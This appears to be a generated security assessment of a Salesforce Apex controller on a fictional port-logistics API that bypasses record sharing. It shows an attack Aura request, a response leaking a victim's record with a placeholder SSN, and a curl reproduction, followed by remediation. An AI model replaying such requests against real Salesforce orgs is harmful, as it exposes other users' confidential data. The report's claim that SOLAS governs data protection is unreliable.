# Security Analysis Report
**System:** HarborFlow Port API (Salesforce-Integrated) — v3.3.0 (FINAL)
**Domain:** Marine / Port Logistics
**Example ID:** SF-0041
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass on `OpportunityController.getOpportunity` — any port logistics Opportunity record readable |

---

## Finding 1 — SOQL Record-Level Access Bypass on Opportunity Object (Pattern 9.2)

### Summary
The Apex controller `OpportunityController` on HarborFlow Port API (`f7e910f8.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. Per §5.0 Pattern 9.2, the Salesforce platform's record-level access controls are negated by the missing `with sharing` keyword — the SOQL query fetches by `opportunityId` alone with no ownership predicate. An attacker substitutes any `opportunityId` in the Aura payload to read port logistics Opportunity records belonging to other users. In a marine / port logistics context, Opportunity records may represent port contracts, vessel service agreements, customs-sensitive cargo data, and shipping operator PII.

**Context artifact note:** §4.0 defines the Apex method as `getOpportunityDetails`, while §5.0 and HAR descriptor (§6.0) both reference `c.OpportunityController.getOpportunity`. Both use `OpportunityController` without sharing; the root cause is identical.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://f7e910f8.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://f7e910f8.lightning.force.com/aura
Authorization: Bearer 00DF7E910F8!ARf7e910f8...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DF7E910F8!ARf7e910f8...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"00110F8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity Record Returned**
```json
{
  "actions": [
    {
      "id": "1;a",
      "state": "SUCCESS",
      "returnValue": {
        "records": [
          {
            "Id": "00110F8",
            "Name": "Victim Opportunity Record",
            "OwnerId": "005VICTIM",
            "InternalNotes__c": "CONFIDENTIAL: internal review notes",
            "SensitiveData__c": "SSN: 000-19-3181"
          }
        ]
      },
      "error": []
    }
  ]
}
```

### Evidence Map

| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 9.2 | SOQL record-level access | Classification | Platform access controls negated |
| §7.0 OWD | Opportunity: Private | Sharing config | Only record owner should have access |
| §8.0 RISK-SF-041 | No `with sharing` | Risk code | Sharing rules not enforced |
| §8.0 RISK-SF-042 | No ownership predicate | Risk code | Any `opportunityId` accepted |
| HAR descriptor | `c.OpportunityController.getOpportunity` | Entry point | |
| HAR params | `opportunityId` | `00110F8` | Victim Opportunity record ID |
| HAR params | `fields` | Full sensitive list | `InternalNotes__c`, `SensitiveData__c` |
| HAR response | `OwnerId` | `005VICTIM` | Differs from attacker's session |
| HAR response | `SensitiveData__c` | `SSN: 000-19-3181` | Port logistics operator PII |

### Steps to Reproduce

```bash
# Step 1 — Authenticate with a valid Salesforce session on f7e910f8.lightning.force.com
SESSION="00DF7E910F8!ARf7e910f8..."

# Step 2 — Submit Aura action with victim opportunityId
curl -s -X POST "https://f7e910f8.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"00110F8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'

# Expected (vulnerable): state: "SUCCESS", OwnerId: "005VICTIM", SensitiveData__c: "SSN: 000-19-3181"
# Expected (secure): state: "ERROR" or empty records — INSUFFICIENT_ACCESS
```

### Remediation

1. **Declare controller `with sharing`:**
   ```apex
   public with sharing class OpportunityController { ... }
   ```
2. **Add ownership predicate to SOQL:**
   ```apex
   WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()
   ```
   plus `WITH SECURITY_ENFORCED`
3. **Validate `opportunityId`** against the session user's accessible record set before executing.
4. **Remove client-controlled `fields` parameter** — define a server-side allowlist for Opportunity fields.
5. **Validate `aura.token`** — submitted value is `undefined`.
6. **Marine / port note:** Opportunity records may represent cargo service contracts and vessel access arrangements. Exposure of operator SSN data constitutes a maritime data protection breach under SOLAS and port authority security requirements.
